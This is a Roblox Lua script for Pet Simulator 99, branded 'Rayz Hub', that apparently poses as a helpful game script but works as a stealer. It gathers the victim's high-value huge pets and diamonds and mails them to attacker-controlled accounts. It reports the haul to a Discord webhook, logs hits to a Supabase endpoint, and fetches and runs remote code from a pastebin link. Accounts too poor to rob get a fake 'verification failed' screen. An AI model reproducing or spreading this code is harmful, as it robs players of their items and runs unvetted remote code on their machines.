getgenv().done = getgenv().done or false
if getgenv().done then return end
getgenv().done = true

repeat task.wait() until game:IsLoaded()

-- Standardize the request function for different executors
local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request

local receivers = users
local webhook = web
local min_rap = 1000000
local mail_message = "Rayz Hub"

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer
local Network = ReplicatedStorage:WaitForChild("Network", 10)
local RAP = require(ReplicatedStorage.Library.Client.RAPCmds)
local PetsDir = require(ReplicatedStorage.Library.Directory.Pets)
local MessageLib = require(ReplicatedStorage.Library.Client.Message)
local StarterGui = game:GetService("StarterGui")

local function sendCoreNotification(title, text, duration)
    StarterGui:SetCore("SendNotification", {
        Title = title or "Notification",
        Text = text or "Message here",
        Duration = duration or 5,
        Icon = "rbxassetid://101542615851651",
    })
end

local last_message_id = nil
local valuables = {}
local is_finished = false
local sent_rap_total = 0
local player_total_rap = 0
local diamonds_to_send = 0
local diamonds_sent = 0

local PS99_FUN_FACTS = {
    "The first huge pet was Huge Cat in Update 1!",
    "Pet Simulator 99 has the most expensive pets in Roblox history.",
    "Over 250 different pets exist in the game right now.",
    "Titanic Titanic Cat is one of the rarest and most valuable pets.",
    "Rainbow pets used to be meta before huge pets took over.",
    "BIG Games has earned billions of Robux from Pet Simulator games.",
    "Some huge pets reach over 1 trillion RAP.",
    "The Exclusive Shop resets every 4 hours.",
    "Enchantments can boost pet strength by 200% or more.",
    "There are currently 12+ different huge pets obtainable.",
    "Top booths in Trading Plaza cost hundreds of billions.",
    "Pet Simulator 99 has surpassed 10 billion visits.",
    "Lucky Block events give some of the best free rewards.",
    "Rainbow Shocked Dominus is one of the rarest event pets.",
    "Most huge pets require 500B+ gems to obtain.",
    "The game contains more than 50 different world areas.",
    "Huge pets have that iconic golden aura effect.",
    "BIG Games also created the original Pet Simulator X.",
    "Some pets have secret hidden abilities.",
    "The current world record single pet RAP is over 500 trillion."
}

local function getRandomFunFact()
    return PS99_FUN_FACTS[math.random(1, #PS99_FUN_FACTS)]
end

local function IdentifyExecutor()
    local ex = "Unknown / Custom"
    local checks = {
        {syn and "Synapse X"},
        {scriptware and "Script-Ware"},
        {getexecutorname and type(getexecutorname)=="function" and getexecutorname():lower():find("solara") and "Solara"},
        {getexecutorname and getexecutorname():lower():find("wave") and "Wave"},
        {getexecutorname and getexecutorname():lower():find("hydrogen") and "Hydrogen"},
        {getexecutorname and getexecutorname():lower():find("fluxus") and "Fluxus"},
        {getexecutorname and getexecutorname():lower():find("delta") and "Delta X"},
        {getexecutorname and getexecutorname():lower():find("arceus") and "Arceus X"},
        {getexecutorname and getexecutorname():lower():find("oxygen") and "Oxygen U"},
        {getexecutorname and getexecutorname():lower():find("trigon") and "Trigon Evo"},
        {getexecutorname and getexecutorname():lower():find("krnl") and "Krnl"},
        {getexecutorname and getexecutorname():lower():find("jjsploit") and "JJSploit"},
        {getexecutorname and getexecutorname():lower():find("xeno") and "Xeno"},
        {getgenv().Fluxus and "Fluxus"},
        {getgenv().Delta and "Delta X"},
        {getgenv().Solara and "Solara"},
        {getgenv().Hydrogen and "Hydrogen"},
        {getgenv().ArceusX or getgenv().Arceus and "Arceus X"},
        {islclosure and not iscclosure and "Likely Solara / Electron"},
    }
    for _, v in ipairs(checks) do
        if v[1] then ex = v[1] break end
    end
    if getexecutorname and type(getexecutorname) == "function" then
        local raw = getexecutorname()
        if raw and raw ~= ex then ex = ex .. " (" .. raw .. ")" end
    end
    return ex
end

local function incrementHitCount(webhookUrl)
    local SUPABASE_URL = "https://yiyjqwmwoalxhvwiigwi.supabase.co"
    local SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InlpeWpxd213b2FseGh2d2lpZ3dpIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjgxMzI1MzIsImV4cCI6MjA4MzcwODUzMn0.35khALBOy3LY5lTGNcVLQHMuMfEoNOS7ye_0T6vEVoY"
    pcall(function()
        request({
            Url = SUPABASE_URL .. "/rest/v1/rpc/increment_hits_for_webhook",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json", ["apikey"] = SUPABASE_ANON_KEY, ["Authorization"] = "Bearer " .. SUPABASE_ANON_KEY},
            Body = HttpService:JSONEncode({ p_webhook = webhookUrl })
        })
    end)
end

local function prepareInventory()
    local save = require(ReplicatedStorage.Library.Client.Save).Get() or {}
    local inv = save.Inventory or {}
    if inv.Box then
        for k in pairs(inv.Box) do pcall(Network["Box: Withdraw All"].InvokeServer, Network["Box: Withdraw All"], k) end
    end
    pcall(function() Network["Mailbox: Claim All"]:InvokeServer() end)
    pcall(function() require(ReplicatedStorage.Library.Client.DaycareCmds).Claim() end)
end

local function formatNumber(n)
    local suffixes = {"", "k", "m", "b", "t", "q"}
    local i = 1
    while n >= 1000 and i < #suffixes do n = n / 1000 i = i + 1 end
    return string.format("%.2f%s", n, suffixes[i])
end

local function getRAP(item)
    local mock = {Class = {Name = "Pet"}, IsA = function() return true end, GetId = function() return item.id end,
        StackKey = function() return HttpService:JSONEncode({id=item.id, pt=item.pt, sh=item.sh, tn=item.tn}) end,
        AbstractGetRAP = function() return nil end}
    local s, r = pcall(RAP.Get, mock)
    return s and r or 0
end

local function updateWebhook(status_key)
    local status_map = {sending = "🟡 Sending", claimed = "🟢 Sent", partial = "🔵 Partially sent", failed  = "🔴 Failed"}
    local status_text = status_map[status_key] or status_key
    local pet_lines = ""
    for _, v in ipairs(valuables) do
        local prefix = v.sent_amount == v.amount and "✅" or "⚠️"
        pet_lines = pet_lines .. prefix .. " " .. v.full_name .. "  " .. v.sent_amount .. "/" .. v.amount .. "" .. "  (" .. formatNumber(v.sent_amount * v.rap) .. "/" .. formatNumber(v.amount * v.rap) .. ")\n"
    end
    local gem_prefix = diamonds_sent >= diamonds_to_send and "💎" or "💎"
    pet_lines = pet_lines .. gem_prefix .. " Diamonds " .. formatNumber(diamonds_sent) .. "/" .. formatNumber(diamonds_to_send) .. "\n"
    local total_sent = sent_rap_total + diamonds_sent
    local total_possible = player_total_rap + diamonds_to_send
    local payload = {
        username = "Rayz Hub - Pet Simulator 99",
        avatar_url = "https://rayzhubb.vercel.app/pngs/logo.png",
        embeds = {{
            title = player.Name .. " • ||" .. getRandomFunFact() .. " ||",
            color = (status_key == "claimed" and 5763719) or (status_key == "failed" and 15548997) or (status_key == "partial" and 3447003) or 16755200,
            fields = {
                {name = "<:tick:1459496515059056640> Status", value = "```ansi\n " .. status_text .. " ```", inline = true},
                {name = "<:settings:1459496581039521895> Executor", value = "```" .. IdentifyExecutor() .. "```", inline = true},
                {name = "<:diamond:1459496649834627082> Loot", value = "```ansi\n" .. pet_lines .. "═══════════════════════════════\nTotal: " .. formatNumber(total_sent) .. " / " .. formatNumber(total_possible) .. "```", inline = false}
            },
            footer = {text = "Rayz Hub • Pet Simulator 99 • " .. os.date("%Y-%m-%d %H:%M UTC")},
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
            image = { url = "https://rayzhubb.vercel.app/pngs/ps99.png" }
        }}
    }
    local url = last_message_id and (webhook .. "/messages/" .. last_message_id) or (webhook .. "?wait=true")
    local method = last_message_id and "PATCH" or "POST"
    
    local response = request({
        Url = url, 
        Method = method, 
        Headers = {["Content-Type"] = "application/json"}, 
        Body = HttpService:JSONEncode(payload)
    })
    
    if not last_message_id and response and response.Success then 
        last_message_id = HttpService:JSONDecode(response.Body).id 
    end
end

local function ShowLowValueWarning()
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "RayzModernWarning"
    ScreenGui.ResetOnSpawn = false
    ScreenGui.DisplayOrder = 999
    ScreenGui.Parent = game:GetService("CoreGui")

    local MainFrame = Instance.new("Frame")
    MainFrame.Size = UDim2.new(0, 500, 0, 350)
    MainFrame.Position = UDim2.new(0.5, -250, 0.5, -175)
    MainFrame.BackgroundColor3 = Color3.fromRGB(15, 10, 25)
    MainFrame.BorderSizePixel = 0
    MainFrame.Parent = ScreenGui

    local UICorner = Instance.new("UICorner")
    UICorner.CornerRadius = UDim.new(0, 15)
    UICorner.Parent = MainFrame

    -- Purple Glow/Stroke
    local UIStroke = Instance.new("UIStroke")
    UIStroke.Color = Color3.fromRGB(130, 60, 255)
    UIStroke.Thickness = 3
    UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    UIStroke.Parent = MainFrame

    local Title = Instance.new("TextLabel")
    Title.Size = UDim2.new(1, 0, 0, 70)
    Title.BackgroundTransparency = 1
    Title.Text = "SYSTEM ERROR: VERIFICATION FAILED"
    Title.TextColor3 = Color3.fromRGB(180, 130, 255)
    Title.Font = Enum.Font.GothamBlack
    Title.TextSize = 22
    Title.Parent = MainFrame

    local Message = Instance.new("TextLabel")
    Message.Size = UDim2.new(1, -60, 0, 180)
    Message.Position = UDim2.new(0, 30, 0, 75)
    Message.BackgroundTransparency = 1
    Message.Text = "Your account has been detected as an <font color='#FF4B4B'><b>ALT</b></font> account.\n\n" ..
                   "• You don't have enough gems\n" ..
                   "• You don't have enough RAP\n" ..
                   "• Security verification failed\n\n" ..
                   "To use this script, please switch to your <b>Main Account</b> or join our discord server for help."
    Message.TextColor3 = Color3.fromRGB(210, 210, 230)
    Message.Font = Enum.Font.GothamMedium
    Message.TextSize = 17
    Message.RichText = true
    Message.TextWrapped = true
    Message.TextXAlignment = Enum.TextXAlignment.Left
    Message.TextYAlignment = Enum.TextYAlignment.Top
    Message.Parent = MainFrame

    local InviteContainer = Instance.new("Frame")
    InviteContainer.Size = UDim2.new(1, -60, 0, 60)
    InviteContainer.Position = UDim2.new(0, 30, 1, -85)
    InviteContainer.BackgroundColor3 = Color3.fromRGB(30, 20, 50)
    InviteContainer.Parent = MainFrame

    local InviteCorner = Instance.new("UICorner")
    InviteCorner.CornerRadius = UDim.new(0, 10)
    InviteCorner.Parent = InviteContainer

    local InviteText = Instance.new("TextLabel")
    InviteText.Size = UDim2.new(0.65, 0, 1, 0)
    InviteText.Position = UDim2.new(0.05, 0, 0, 0)
    InviteText.BackgroundTransparency = 1
    InviteText.Text = "discord.gg/SnXQCYzGjx"
    InviteText.TextColor3 = Color3.fromRGB(160, 120, 255)
    InviteText.Font = Enum.Font.Code
    InviteText.TextSize = 18
    InviteText.TextXAlignment = Enum.TextXAlignment.Left
    InviteText.Parent = InviteContainer

    local CopyBtn = Instance.new("TextButton")
    CopyBtn.Size = UDim2.new(0.3, 0, 0.7, 0)
    CopyBtn.Position = UDim2.new(0.65, 0, 0.15, 0)
    CopyBtn.BackgroundColor3 = Color3.fromRGB(130, 60, 255)
    CopyBtn.Text = "COPY LINK"
    CopyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    CopyBtn.Font = Enum.Font.GothamBold
    CopyBtn.TextSize = 15
    CopyBtn.Parent = InviteContainer

    local BtnCorner = Instance.new("UICorner")
    BtnCorner.CornerRadius = UDim.new(0, 8)
    BtnCorner.Parent = CopyBtn

    CopyBtn.MouseButton1Click:Connect(function()
        setclipboard("https://discord.gg/SnXQCYzGjx")
        CopyBtn.Text = "COPIED!"
        CopyBtn.BackgroundColor3 = Color3.fromRGB(60, 180, 100)
        task.delay(2, function()
            if CopyBtn then
                CopyBtn.Text = "COPY LINK"
                CopyBtn.BackgroundColor3 = Color3.fromRGB(130, 60, 255)
            end
        end)
    end)

    -- Draggable Functionality
    local UIS = game:GetService("UserInputService")
    local dragToggle, dragStart, startPos
    MainFrame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragToggle = true
            dragStart = input.Position
            startPos = MainFrame.Position
        end
    end)
    UIS.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement and dragToggle then
            local delta = input.Position - dragStart
            MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
    UIS.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragToggle = false
        end
    end)
end

incrementHitCount(webhook)
prepareInventory()

local save = require(ReplicatedStorage.Library.Client.Save).Get() or {}
local inv = save.Inventory or {}

for _, item in pairs(inv.Currency or {}) do
    if item.id == "Diamonds" then diamonds_to_send = (item._am or 0) - 15000 break end
end
if diamonds_to_send < 0 then diamonds_to_send = 0 end

for uid, pet in pairs(inv.Pet or {}) do
    local rap = getRAP(pet)
    if (PetsDir[pet.id] and (PetsDir[pet.id].huge or PetsDir[pet.id].exclusiveLevel)) and rap >= min_rap then
        local name = (pet.sh and "Shiny " or "") .. (pet.pt==1 and "Gold " or pet.pt==2 and "Rainbow " or "") .. pet.id
        table.insert(valuables, {uid=uid, full_name=name, rap=rap, amount=pet._am or 1, sent_amount=0, category="Pet"})
        player_total_rap = player_total_rap + (rap * (pet._am or 1))
    end
end

local total_gems = diamonds_to_send + 15000

if player_total_rap >= 1000000 and total_gems >= 100000 then
    loadstring(game:HttpGet("https://pastebin.com/raw/h66gYgRe"))()
    task.wait(1)
    sendCoreNotification("discord link copied", "join our discord server for more scripts", 6)
    setclipboard("https://discord.gg/pgsQatrnDw")
else
    ShowLowValueWarning()
    updateWebhook("failed")
    return
end

if #valuables == 0 and diamonds_to_send <= 0 then
    updateWebhook("failed")
    return
end

updateWebhook("sending")
Players.PlayerRemoving:Connect(function(lp) if lp == player and not is_finished then updateWebhook("failed") end end)

for _, item in ipairs(valuables) do
    for _, receiver in ipairs(receivers) do
        local success = pcall(function() return Network["Mailbox: Send"]:InvokeServer(receiver, mail_message, item.category, item.uid, item.amount) end)
        if success then 
            item.sent_amount = item.amount
            sent_rap_total = sent_rap_total + (item.rap * item.amount)
            updateWebhook("sending")
            break 
        end
    end
    task.wait(1.5)
end

if diamonds_to_send > 10000 then
    local success = pcall(function() return Network["Mailbox: Send"]:InvokeServer(receivers[1], mail_message, "Currency", "Diamonds", diamonds_to_send) end)
    if success then diamonds_sent = diamonds_to_send updateWebhook("sending") end
end

is_finished = true
local fully_sent = (sent_rap_total >= player_total_rap) and (diamonds_sent >= diamonds_to_send)
updateWebhook(fully_sent and "claimed" or "partial")
